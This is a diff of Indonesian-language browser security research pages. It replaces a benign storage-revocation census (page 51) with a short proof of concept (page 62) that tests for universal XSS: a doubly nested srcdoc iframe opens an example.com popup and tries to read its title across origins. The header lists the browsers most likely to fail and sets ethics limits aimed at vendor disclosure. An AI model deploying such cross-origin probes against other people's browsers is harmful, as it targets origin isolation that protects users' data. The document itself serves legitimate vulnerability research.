@@ -1,167 +1,25 @@
-<!-- KONSTRUKSI: sensus KELENGKAPAN pencabutan — apakah kunci yang dipakai tombol Hapus di UI sama dengan kunci yang dipakai mesin penegaknya, dan adakah state hidup yang tak bisa disebut, apalagi dihapus, oleh jalur UI mana pun. -->
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>51 — Revocation reachability</title>
-<style>
-body{font:15px/1.55 system-ui,Segoe UI,Arial,sans-serif;margin:0;padding:1rem;color:#111;background:#fff}
-.wrap{max-width:1000px;margin:0 auto}
-h2{font-size:1.1rem;margin:.2rem 0 .7rem;line-height:1.35}
-.box{border:1px solid #ccc;border-left:5px solid #888;border-radius:8px;padding:.6rem .8rem;margin:.55rem 0}
-.box>b:first-child{display:block;font-size:.75rem;letter-spacing:.09em;color:#666;margin-bottom:.25rem}
-.q{border-left-color:#d33;background:#fff8f8}.m{border-left-color:#36c}.o{border-left-color:#e90}
-.k{border-left-color:#0a7;background:#f4fbf7}.j{border-left-color:#606}
-code{background:#f1f1f1;padding:.05rem .3rem;border-radius:4px;font-size:.9em;word-break:break-all}
-.scroll{overflow-x:auto}
-table{border-collapse:collapse;width:100%;font:12px/1.4 ui-monospace,Consolas,monospace;margin-top:.4rem}
-th,td{border:1px solid #ccc;padding:3px 6px;text-align:left;vertical-align:top;white-space:nowrap}
-th{background:#f3f3f3}
-button{font:inherit;padding:.35rem .6rem;margin:.15rem .3rem .15rem 0;border:1px solid #999;border-radius:7px;background:#fafafa;cursor:pointer}
-textarea{width:100%;height:150px;font:11px/1.4 ui-monospace,Consolas,monospace;padding:.4rem;box-sizing:border-box}
-.no{color:#a00}.ok{color:#070}.mut{color:#777;font-size:.86rem}
-.big{font:600 15px/1.5 ui-monospace,Consolas,monospace}
-@media(prefers-color-scheme:dark){body{background:#161616;color:#eaeaea}.box{border-color:#3a3a3a}
- code,th{background:#2a2a2a}td,th,table{border-color:#3a3a3a}.k{background:#12211a}.q{background:#221414}
- button,textarea{background:#242424;color:#eee;border-color:#555}.mut,.box b{color:#9a9a9a}.no{color:#ff9a9a}.ok{color:#7ddba0}}
-</style>
-</head>
-<body><div class="wrap">
-
-<h2>51 — REVOCATION REACHABILITY: sensus state yang tak bisa dicabut lewat UI mana pun</h2>
-
-<div class="box q"><b>PERTANYAAN YANG BELUM PERNAH DIAJUKAN</b>
-Setiap catatan yang browser tulis punya tombol Hapus — tapi apakah <b>KUNCI</b> yang dipakai tombol itu sama dengan
-kunci yang dipakai <b>mesin penegaknya</b>, dan adakah state yang <b>tak bisa disebut, apalagi dihapus</b>, oleh
-jalur UI mana pun?
-<div class="mut" style="margin-top:.35rem">Ini bukan “pakai pembukuan browser sebagai wasit siapa yang bertindak” (itu properti KEBENARAN atribusi, sumbu
-lama). Yang diukur di sini properti <b>KELENGKAPAN</b>: kesetaraan antara kunci-pencatatan, kunci-penegakan, dan
-kunci-pencabutan. Kelas kegagalannya adalah <b>state yang tak terjangkau UI</b> — dan ia tetap muncul walau setiap
-atribusi origin benar 100&nbsp;%. Buktinya persisten dan bisa diperiksa ulang berhari-hari kemudian, bukan
-screenshot sesaat.</div>
-</div>
-
-<p class="mut">URL asli halaman ini saat dimuat: <code id="h0">…</code> &nbsp;·&nbsp; nonce sesi ini: <code id="nc">…</code></p>
-
-<div class="box m"><b>LANGKAH 1 — LAHIRKAN TEPAT SATU ENTRI DI TIAP PEMBUKUAN</b>
-<p style="margin:.1rem 0 .3rem"><button id="bs">LAHIRKAN YANG TANPA PROMPT (penyimpanan)</button></p>
-<p style="margin:.1rem 0 .3rem">Yang berikut memunculkan prompt/aksi nyata — satu klik masing-masing, semuanya opsional:
-<button id="bn">izin Notification</button><button id="bg">izin Geolocation</button>
-<button id="bp">registerProtocolHandler</button><button id="bd">unduhan (blob milik sendiri)</button></p>
-<div class="mut">Geolocation: koordinatnya <b>tidak dibaca, tidak ditampilkan, tidak disimpan, tidak dikirim ke mana pun</b> —
-yang dibutuhkan hanya entri izinnya. Unduhan menulis satu berkas teks kecil bernama <code>rr51-riset-artefak.txt</code>
-dari blob yang dibuat halaman ini sendiri; tidak ada jaringan yang tersentuh.</div>
-</div>
-
-<div class="box m"><b>LANGKAH 2 — SATU PENGHAPUSAN PER EKSPERIMEN</b>
-Ambil potret <b>SEBELUM</b>, lalu tekan <b>tepat satu</b> jalur penghapusan di UI browser, lalu tekan tombol potret
-yang sesuai. Jangan menumpuk dua jalur dalam satu eksperimen.
-<p style="margin:.35rem 0 .2rem">
-<button id="p0">POTRET: SEBELUM</button>
-<button id="p1">SESUDAH: “Delete data” pada baris situs</button>
-<button id="p2">SESUDAH: “Reset permissions”</button>
-<button id="p3">SESUDAH: Clear browsing data</button>
-<button id="p4">SESUDAH: hapus dari daftar unduhan</button>
-<button id="p5">KONTROL: tidak menekan apa pun</button>
-</p>
-<div class="mut">Letak jalurnya: Chromium <code>chrome://settings/content/all</code> (cari origin ini) ·
-<code>chrome://settings/clearBrowserData</code> · <code>chrome://downloads</code>. Firefox
-<code>about:preferences#privacy</code> → Cookies and Site Data / Manage Permissions. Safari: Settings → Privacy →
-Manage Website Data. <b>Halaman ini tidak pernah menavigasi ke sana untukmu.</b></div>
-<div class="mut" id="st" style="margin-top:.3rem">siap.</div>
-</div>
-
-<div class="box o"><b>ORACLE — dua angka</b>
-<ul style="margin:.3rem 0 0;padding-left:1.1rem">
-<li><b>R/S</b> = berapa state yang <b>selamat</b> dari jalur UI yang <b>mengklaim</b> menghapusnya.</li>
-<li><b>O</b> = jumlah <b>state yatim</b>: state hidup yang tidak diwakili <b>satu baris pun</b> di UI pengelola mana
-pun, karena itu tak bisa dicabut secara sadar oleh user.</li>
-<li><b>R = O = 0 dilaporkan apa adanya</b> sebagai pernyataan kelengkapan pencabutan — itu hasil positif yang
-berharga, bukan kegagalan eksperimen.</li>
-<li><b>Kandidat yang sudah dinamai di muka dan wajib diuji lebih dulu:</b> entri <code>registerProtocolHandler</code>
-dan izin yang bertahan melewati “Delete data”, serta <b>OPFS</b> dan <b>kuota</b> yang tak punya baris sendiri.</li>
-</ul>
-</div>
-
-<div class="box j"><b>HASIL</b>
-<p class="big" id="hd">(belum ada potret)</p>
-<div class="scroll"><table><thead><tr id="hr"><th>pembukuan</th><th>diklaim dihapus oleh</th><th>kunci yang UI TAMPILKAN (anotasi)</th><th>kunci yang MESIN TEGAKKAN (anotasi)</th><th>punya baris UI? (anotasi)</th></tr></thead><tbody id="tb"></tbody></table></div>
-<div class="mut" style="margin-top:.3rem">Tiga kolom bertanda <b>(anotasi)</b> adalah <b>klaim yang harus kamu verifikasi sendiri di setelan</b>, bukan hasil
-ukur. Kolom potret adalah hasil ukur. <b>O dihitung dari kolom anotasi</b> — jadi kalau kamu menemukan baris UI yang
-belum kutahu, koreksi anotasinya dan O ikut turun. Sel yang berbunyi <b>“tidak didukung di browser ini”</b>
-tampil sebagai <code>n/a</code> di TSV — pembukuan itu tidak ada di mesin ini, jadi ia tidak dihitung ke R/S
-maupun O.</div>
-</div>
-
-<div class="box"><b>SALIN APA ADANYA (TSV)</b>
-<textarea id="tsv" readonly></textarea>
-</div>
-
-<div class="box k"><b>BATAS / ETIKA</b>
-Semua state yang dilahirkan adalah milik origin berkas ini sendiri, ber-nonce, dan sepenuhnya jinak. Tanpa form,
-tanpa input kredensial, tanpa fetch/XHR/WebSocket/beacon ke kolektor mana pun, tanpa aset eksternal, tanpa
-obfuskasi, tanpa peniruan merek. Tidak ada loop: setiap potret adalah satu putaran pembacaan dengan batas
-waktu 3 detik. Web Lock melepas dirinya sendiri setelah 60 detik. <b>Dicoret dari lingkup</b> (tidak bisa
-dilahirkan dari satu berkas tunggal, dan berpura-pura sebaliknya akan membuat tabel ini berbohong):
-ServiceWorker dan salinan penyimpanan lintas-situs dari iframe pihak-ketiga.
-</div>
-
+<!-- 62 - popup dibuka oleh CUCU srcdoc   [UXSS popup | U1=popup U2=rantai pewarisan dua lapis | T2 | macOS: Dia/Arc/Safari/Chrome]
+     GERBANG YANG DISERANG : pewarisan berantai srcdoc + kebijakan navigasi frame
+     DI MANA PALING MUNGKIN TEMBUS : fork yang tertinggal patch (Dia/Arc/Brave/Vivaldi/Opera/Samsung),
+                 WebView & in-app browser, build lama, atau konteks ber-sandbox/ekstensi. Di Chrome/Safari
+                 terbaru yang sehat, jawaban BLOCKED adalah jawaban yang BENAR - catat versinya, jangan dipaksa.
+     MEKANISME : yang memanggil open() adalah dokumen srcdoc di dalam dokumen srcdoc. Setiap lapisan mewarisi origin, dan yang diuji apakah lapisan kedua masih menurunkan hak yang sama ke popup setelah popup itu pindah ke korban.
+     PREDIKAT  : popup keturunan cucu tetap terbaca dari puncak.
+     AMAN      : akses lintas-origin ditolak SecurityError; baris bukti berkata BLOCKED.
+     ANTI-FP   : vonis HANYA dari pembacaan isi korban (judul/origin yang dilaporkan sendiri).
+                 "berhasil menulis" ke dokumen kosong awal BUKAN bukti - itu memang dokumen kita.
+                 Kontrol batch = 64.html; kalau 64 ikut CROSSED, semua hasil batch ini batal.
+     ETIKA     : browser & mesin sendiri. Korban = example.com (IANA reserved). Nol form, nol kredensial,
+                 nol fetch/beacon, nol resource luar. Berhenti di predikat -> screenshot -> lapor VRP. -->
+<meta charset="utf-8"><title>62 popup dibuka oleh CUCU srcdoc</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-(function(){
-var HREF0=location.href,K='rr51',N='n'+Math.random().toString(36).slice(2,8),shots=[],rows=null;
-function $(i){return document.getElementById(i)}
-function st(s){$('st').textContent=s}
-function E(v){return String(v).replace(/[<>&]/g,'')}
-var L=[
-['localStorage','delete-data,clear-browsing-data','origin','origin','ada',function(){try{localStorage.setItem(K,N)}catch(e){}},function(cb){try{cb(localStorage.getItem(K)===N?'ADA':'TIDAK')}catch(e){cb('n/a')}}],
-['sessionStorage','delete-data,clear-browsing-data','origin (tak punya baris sendiri)','origin + tab','tidak',function(){try{sessionStorage.setItem(K,N)}catch(e){}},function(cb){try{cb(sessionStorage.getItem(K)===N?'ADA':'TIDAK')}catch(e){cb('n/a')}}],
-['cookie','delete-data,clear-browsing-data','eTLD+1','domain + path','ada',function(){try{document.cookie=K+'='+N+';path=/;max-age=1800'}catch(e){}},function(cb){cb(document.cookie.indexOf(K+'='+N)<0?'TIDAK':'ADA')}],
-['IndexedDB','delete-data,clear-browsing-data','origin','origin','ada',function(){if(!self.indexedDB)return;var q=indexedDB.open(K,1);q.onupgradeneeded=function(){q.result.createObjectStore('s')};q.onsuccess=function(){try{q.result.transaction('s','readwrite').objectStore('s').put(N,1)}catch(e){}setTimeout(function(){try{q.result.close()}catch(e){}},400)}},
- function(cb){if(!self.indexedDB||!indexedDB.databases)return cb('TAK ADA API BACA-ULANG');indexedDB.databases().then(function(l){var s='TIDAK',i;for(i=0;i<l.length;i++)if(l[i].name===K)s='ADA';cb(s)},function(){cb('n/a')})}],
-['CacheStorage','delete-data,clear-browsing-data','origin','origin','ada',function(){if(self.caches)caches.open(K).then(function(c){c.put(new Request(K+'-'+N),new Response('x'))})},
- function(cb){if(!self.caches)return cb('n/a');caches.keys().then(function(l){cb(l.indexOf(K)<0?'TIDAK':'ADA')},function(){cb('n/a')})}],
-['OPFS (origin private FS)','delete-data,clear-browsing-data','tak ditampilkan terpisah','origin','tidak',function(){if(navigator.storage&&navigator.storage.getDirectory)navigator.storage.getDirectory().then(function(d){return d.getFileHandle(K+'.txt',{create:true})}).catch(function(){})},
- function(cb){if(!navigator.storage||!navigator.storage.getDirectory)return cb('n/a');navigator.storage.getDirectory().then(function(d){return d.getFileHandle(K+'.txt')}).then(function(){cb('ADA')},function(){cb('TIDAK')})}],
-['kuota — storage.estimate().usage','clear-browsing-data','tak ditampilkan sama sekali','origin','tidak',function(){},
- function(cb){if(!navigator.storage||!navigator.storage.estimate)return cb('n/a');navigator.storage.estimate().then(function(e){cb(Math.round((e.usage||0)/1024)+' KiB')},function(){cb('n/a')})}],
-['izin Notification','reset-permissions,delete-data,clear-browsing-data','origin','origin','ada',function(){try{Notification.requestPermission()}catch(e){}},
- function(cb){cb(typeof Notification==='undefined'?'n/a':Notification.permission)}],
-['izin Geolocation','reset-permissions,delete-data,clear-browsing-data','origin','origin','ada',function(){try{navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:5000})}catch(e){}},
- function(cb){if(!navigator.permissions)return cb('n/a');navigator.permissions.query({name:'geolocation'}).then(function(p){cb(p.state)},function(){cb('n/a')})}],
-['registerProtocolHandler','reset-permissions,delete-data','tidak diketahui','origin + skema','tidak diketahui',function(){try{navigator.registerProtocolHandler('web+'+K,location.href.split('?')[0]+'?h=%s')}catch(e){st('protocol handler ditolak: '+e.name+' (skema file:// atau butuh https)')}},
- function(cb){cb('TAK ADA API BACA-ULANG')}],
-['Web Lock (nama, umur-tab)','(tak ada jalur)','tak ditampilkan sama sekali','origin','tidak',function(){try{navigator.locks.request(K,function(){return new Promise(function(r){setTimeout(r,60000)})})}catch(e){}},
- function(cb){if(!navigator.locks||!navigator.locks.query)return cb('n/a');navigator.locks.query().then(function(q){var i,s='TIDAK';for(i=0;i<q.held.length;i++)if(q.held[i].name===K)s='ADA';cb(s)},function(){cb('n/a')})}],
-['unduhan (<a download> blob sendiri)','hapus-unduhan,clear-browsing-data','nama berkas (bukan origin)','—','ada',function(){var u=URL.createObjectURL(new Blob(['artefak riset '+N],{type:'text/plain'})),a=document.createElement('a');a.href=u;a.download='rr51-riset-artefak.txt';a.click();setTimeout(function(){URL.revokeObjectURL(u)},4000)},
- function(cb){cb('TAK ADA API BACA-ULANG')}]];
-function alive(i,v){var n=L[i][0];return n.indexOf('izin')===0?v==='granted':(n.indexOf('kuota')===0?parseInt(v,10)>0:v==='ADA')}
-function snap(tag){var out=[],n=0,done=0,i;
- function hit(){if(!done&&n>=L.length){done=1;push(tag,out)}}
- for(i=0;i<L.length;i++)(function(i){try{L[i][6](function(v){if(out[i]===undefined){out[i]=String(v);n++;hit()}})}catch(e){out[i]='n/a';n++;hit()}})(i);
- setTimeout(function(){if(!done){done=1;for(var j=0;j<L.length;j++)if(out[j]===undefined)out[j]='timeout';push(tag,out)}},3000)}
-function push(tag,out){shots.push({t:tag,v:out});if(shots.length>8)shots.shift();render();st('potret "'+tag+'" diambil ('+shots.length+' kolom).')}
-function render(){var h='',hr='<th>pembukuan</th><th>diklaim dihapus oleh</th><th>kunci yang UI TAMPILKAN (anotasi)</th><th>kunci yang MESIN TEGAKKAN (anotasi)</th><th>punya baris UI? (anotasi)</th>',i,s,R=0,O=0,last=shots[shots.length-1];
- for(s=0;s<shots.length;s++)hr+='<th>'+E(shots[s].t)+'</th>';
- var x='pembukuan\tdiklaim_dihapus_oleh\tkunci_ui\tkunci_mesin\tbaris_ui';
- for(s=0;s<shots.length;s++)x+='\t'+shots[s].t;x+='\n';
- for(i=0;i<L.length;i++){h+='<tr><td>'+L[i][0]+'</td><td>'+L[i][1]+'</td><td>'+L[i][2]+'</td><td>'+L[i][3]+'</td><td>'+(L[i][4]==='tidak'?'<b class="no">tidak</b>':L[i][4])+'</td>';
-  x+=L[i][0]+'\t'+L[i][1]+'\t'+L[i][2]+'\t'+L[i][3]+'\t'+L[i][4];
-  for(s=0;s<shots.length;s++){var v=shots[s].v[i],cl=(L[i][1].indexOf(shots[s].t)>=0&&alive(i,v))?' class="no"':'';h+='<td'+cl+'>'+(v==='n/a'?'<span class="mut">tidak didukung di browser ini</span>':E(v))+'</td>';x+='\t'+v}
-  h+='</tr>\n';x+='\n';
-  if(last){var lv=last.v[i];if(L[i][1].indexOf(last.t)>=0&&alive(i,lv))R++;if(L[i][4]==='tidak'&&alive(i,lv))O++}}
- $('hr').innerHTML=hr;$('tb').innerHTML=h;
- $('hd').innerHTML=last?('potret terakhir: <b>'+E(last.t)+'</b><br>R/S = <b>'+R+'</b> state selamat dari jalur yang mengklaim menghapusnya &nbsp;·&nbsp; O = <b>'+O+'</b> state yatim (hidup, tanpa baris UI mana pun)'+((R+O===0)?' &nbsp;→ <b class="ok">PERNYATAAN KELENGKAPAN PENCABUTAN: R = O = 0 pada jalur ini</b>':' &nbsp;→ <b class="no">ada state yang tak terjangkau jalur pencabutannya</b>')):'(belum ada potret)';
- $('tsv').value='# potret terakhir\t'+(last?last.t:'-')+'\n# R/S='+R+'\tO='+O+'\n# nonce\t'+N+'\n'+x+'# href_asli\t'+HREF0+'\n# ua\t'+navigator.userAgent+'\n'}
-$('h0').textContent=HREF0;$('nc').textContent=N;render();
-$('bs').onclick=function(){var i;for(i=0;i<L.length;i++)if(i!==7&&i!==8&&i!==9&&i!==11)L[i][5]();
- st('state penyimpanan dilahirkan (nonce '+N+') — sebagian API asinkron, potret SEBELUM diambil otomatis 900 ms lagi…');setTimeout(function(){snap('SEBELUM')},900)};
-$('bn').onclick=function(){L[7][5]();st('izin Notification diminta.')};
-$('bg').onclick=function(){L[8][5]();st('izin Geolocation diminta — koordinat tidak dibaca.')};
-$('bp').onclick=function(){L[9][5]();st('registerProtocolHandler dipanggil (web+'+K+').')};
-$('bd').onclick=function(){L[11][5]();st('satu unduhan blob milik sendiri dipicu.')};
-var tags=['SEBELUM','delete-data','reset-permissions','clear-browsing-data','hapus-unduhan','kontrol'];
-for(var b=0;b<6;b++)(function(i){$('p'+i).onclick=function(){st('membaca…');snap(tags[i])}})(b);
-})();
+var V='https://example.com/';var o;function say(s){o=o||document.getElementById('o');o.textContent=s;}
+function rd(w){try{var t=w.document.title;return 'CROSSED -> baca judul lintas-origin: "'+t+'"';}catch(e){return 'BLOCKED (aman): '+e.name;}}
+addEventListener('load',function(){say('REAL: '+location.origin+' | siap');});
+function go(){var f=document.createElement('iframe');
+f.srcdoc="<iframe id=g srcdoc=\"<script>setTimeout(function(){var w=open('"+V+"','z');setTimeout(function(){var r;try{r='CROSSED -> '+w.document.title;}catch(e){r='BLOCKED (aman): '+e.name;}top.postMessage(r,'*');},3000);},300);<\/script>\"></iframe>";
+document.body.appendChild(f);addEventListener('message',function(e){say('dari cucu srcdoc: '+e.data);});
+say('rantai srcdoc dua lapis dipasang...');}
 </script>
-</div></body></html>
